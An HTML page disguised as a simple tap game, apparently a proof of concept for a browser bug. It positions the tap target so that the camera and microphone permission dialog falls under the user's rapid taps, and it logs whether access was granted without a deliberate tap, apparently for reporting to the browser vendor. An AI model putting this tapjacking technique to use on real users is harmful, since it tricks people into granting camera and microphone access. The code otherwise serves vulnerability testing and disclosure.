<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Tap Game</title>
<style>
  body { margin: 0; font-family: sans-serif; background: #111; color: #fff; touch-action: manipulation; }
  #target {
    /* Posisikan target sedikit di ATAS tengah supaya dialog "Allow"
       yang muncul di bawah-tengah jatuh tepat di path tap user */
    position: fixed; top: 38%; left: 50%; transform: translate(-50%, -50%);
    width: 70vw; height: 70vw; max-width: 320px; max-height: 320px;
    border-radius: 50%; background: #3a7;
    display: flex; align-items: center; justify-content: center;
    font-size: 22px; user-select: none;
  }
  #score { position: fixed; top: 10px; left: 10px; font-size: 20px; }
  #log { position: fixed; bottom: 5px; left: 5px; font-size: 11px; color: #888; }
</style>
</head>
<body>
<div id="target">TAP AKU</div>
<div id="score">Score: 0</div>
<div id="log"></div>

<script>
let score = 0;
const target = document.getElementById('target');
const log = document.getElementById('log');

async function askPerm() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    stream.getTracks().forEach(t => t.stop());
    log.textContent = 'ALLOWED TANPA TAP EKSPLISIT — REPORT INI';
  } catch (e) { /* denied */ }
}

// touchstart lebih cepat dari click di mobile (no 300ms delay,
// dan event sampai sebelum dialog intercept)
target.addEventListener('touchstart', () => {
  score++;
  document.getElementById('score').textContent = 'Score: ' + score;
  askPerm();
}, { passive: true });

// Juga log semua touch di document — buat debug apakah tap "tembus"
// ke elemen di bawah dialog (event interception bug)
document.addEventListener('touchstart', e => {
  console.log('touch at', e.touches[0].clientX, e.touches[0].clientY,
              'on', e.target.tagName);
}, { passive: true, capture: true });
</script>
</body>
</html>
